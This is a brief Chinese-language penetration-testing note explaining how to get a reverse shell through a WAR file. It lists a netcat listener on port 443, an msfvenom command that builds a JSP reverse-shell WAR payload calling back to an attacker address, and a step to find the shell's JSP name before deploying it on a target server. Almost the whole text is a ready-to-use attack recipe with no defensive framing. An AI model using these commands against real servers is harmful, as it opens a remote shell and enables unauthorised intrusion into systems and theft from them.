# War文件反弹shell

首先在本地监听TCP协议443端口

```
nc -lvp 443

```

使用如下命令生成war文件：

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f war > reverse.war

```

查看war包中shell的jsp文件名

```bash
strings reverse.war | grep jsp

```

在靶机上部署war包后，访问shell的jsp文件，即可在监听端口获得反弹shell

